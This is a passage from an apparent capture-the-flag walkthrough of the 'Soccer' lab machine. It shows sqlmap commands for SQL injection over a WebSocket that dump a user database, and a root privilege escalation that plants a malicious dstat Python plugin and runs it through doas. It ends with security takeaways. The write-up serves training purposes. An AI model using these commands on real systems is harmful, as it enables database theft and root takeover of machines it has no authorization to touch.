Phase 2

Lateral Movement — WebSocket SQL Injection

Discover the Hidden Subdomain

www-data@soccer:~$ cat /etc/nginx/sites-enabled/soc-player.htb
server {
    listen 80;
    server_name soc-player.soccer.htb;
    root /root/app/views;
    location / {
        proxy_pass http://localhost:3000;
        # WebSocket Upgrade headers configured
    }
}
$ echo "10.129.44.204 soc-player.soccer.htb" | sudo tee -a /etc/hosts

Identify the Injection Point

Register an account at http://soc-player.soccer.htb/signup, then login. The dashboard has a ticket check feature that sends queries via WebSocket on port 9091:

ws://soc-player.soccer.htb:9091
→ sends: {"id": "12345"}
← returns: Ticket Exists / Ticket Doesn't Exist
WebSocket SQL injection SQL injection doesn't only happen in HTTP GET/POST parameters. Here, the backend receives the id value over a WebSocket connection and concatenates it directly into a SQL query. sqlmap supports WebSocket URLs natively — use ws:// as the URL scheme and mark the injection point with *.

sqlmap via WebSocket

# Enumerate databases
$ sqlmap -u "ws://soc-player.soccer.htb:9091" \
  --data '{"id": "*"}' \
  --dbs --threads 10 --level 5 --risk 3 --batch
available databases:
[*] soccer_db

# Dump the accounts table
$ sqlmap -u "ws://soc-player.soccer.htb:9091" \
  --data '{"id": "*"}' \
  --threads 10 -D soccer_db --dump --batch
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |

Phase 3

Privilege Escalation — doas + dstat Plugin Injection

Discover doas Configuration

player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
doas + dstat = plugin-based root doas is OpenBSD's lightweight alternative to sudo. dstat is a system monitoring tool that loads Python plugins from several directories — including /usr/local/share/dstat/. If that directory is writable by the current user, we can drop a malicious plugin there. When dstat runs as root via doas, our plugin executes as root. Plugin files must be named dstat_<name>.py, and are loaded with --<name>.

Create Malicious Plugin

# Check writable plugin directory
player@soccer:~$ ls -la /usr/local/share/dstat/
drwxrwx--- 2 root player 4096 ...

# Write a plugin that spawns a root shell
player@soccer:~$ echo -e 'import os\n\nos.system("/bin/bash")' \
  > /usr/local/share/dstat/dstat_0xdf.py

# Trigger it — plugin name = filename minus 'dstat_' prefix and '.py' suffix
player@soccer:~$ doas /usr/bin/dstat --0xdf

root@soccer:/home/player# whoami
root

root@soccer:~# cat /root/root.txt
73e705b57c9cc78a2467ac113e25544c
Appendix

Key Takeaways

Default credentials are still the #1 entry point.

Tiny File Manager's admin:admin@123 is documented on its GitHub. Always check known defaults before anything else.

SQL injection lives in WebSockets too.

Not all injection points are in HTTP parameters. WebSocket messages, gRPC calls, GraphQL queries — any protocol that carries user input to a database is a potential SQLi vector. sqlmap handles ws:// natively.

nginx configs reveal hidden subdomains.

After getting a shell, always check /etc/nginx/sites-enabled/ and /etc/apache2/sites-enabled/. Internal vhosts often host additional attack surface invisible from external enumeration.

dstat plugin directories + doas = classic privilege escalation.

Any tool that loads user-writable plugins and runs as root via sudo/doas is exploitable. dstat, ansible, pip — check GTFOBins for the full list.
